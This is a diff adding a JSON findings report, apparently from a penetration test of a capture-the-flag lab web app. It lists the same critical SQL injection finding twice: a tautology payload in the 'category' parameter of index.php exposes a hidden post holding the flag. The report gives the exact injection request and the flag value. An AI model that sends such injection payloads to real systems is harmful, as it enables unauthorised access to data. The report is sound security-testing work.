@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T00:58:08.167244+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "097e0e13-f8e5-4b3f-9404-8556be1228fe",
+      "timestamp": "2026-04-15T00:58:08.167117+00:00",
+      "title": "SQL Injection in category parameter reveals secret flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:45641",
+      "description": "The category GET parameter in index.php is vulnerable to SQL injection. By injecting a tautology (' OR '1'='1), the WHERE clause is bypassed and all posts are returned, including a hidden 'SECRET POST' in the Secret category containing the flag.",
+      "evidence": "flag{7b228415-018a-4446-ad84-66153396e7c6}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /?category=Secret'%20OR%20'1'='1",
+        "expected": "HTML response contains SECRET POST with flag{7b228415-018a-4446-ad84-66153396e7c6}"
+      }
+    },
+    {
+      "id": "6388e9b8-00c6-4433-b14e-a2acea01fd8b",
+      "timestamp": "2026-04-15T00:58:08.248528+00:00",
+      "title": "SQL Injection in category parameter reveals secret flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:45641",
+      "description": "The category GET parameter in index.php is vulnerable to SQL injection. By injecting a tautology (' OR '1'='1), the WHERE clause is bypassed and all posts are returned, including a hidden 'SECRET POST' in the Secret category containing the flag.",
+      "evidence": "flag{7b228415-018a-4446-ad84-66153396e7c6}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /?category=Secret'%20OR%20'1'='1",
+        "expected": "HTML response contains SECRET POST with flag{7b228415-018a-4446-ad84-66153396e7c6}"
+      }
+    }
+  ],
+  "diagrams": []
+}
